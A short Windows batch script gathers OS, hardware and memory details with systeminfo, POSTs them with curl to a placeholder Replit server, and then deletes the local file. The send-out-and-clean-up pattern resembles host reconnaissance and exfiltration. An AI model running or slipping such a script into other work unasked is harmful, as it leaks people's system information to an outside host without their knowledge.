@echo off
:: Collect important system information
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"Processor(s)" /C:"Total Physical Memory" /C:"Available Physical Memory" > important_sysinfo.txt

:: Send the data to the Replit server
curl -X POST -H "Content-Type: text/plain" --data-binary "@important_sysinfo.txt" https://your-repl-name.repl.co/

:: Clean up
del important_sysinfo.txt
